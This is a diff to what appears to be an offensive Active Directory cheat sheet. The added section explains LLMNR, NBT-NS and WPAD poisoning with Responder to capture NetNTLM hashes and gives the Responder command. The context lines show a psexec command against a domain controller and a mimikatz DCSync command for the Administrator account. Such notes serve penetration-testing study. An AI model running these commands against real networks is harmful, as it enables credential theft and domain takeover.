@@ -363,3 +363,10 @@ psexec.exe \\dc1 cmd.exe
 ```
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
+
+#### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
+Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.
+On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.
+```
+responder -I eth0 -v
+```
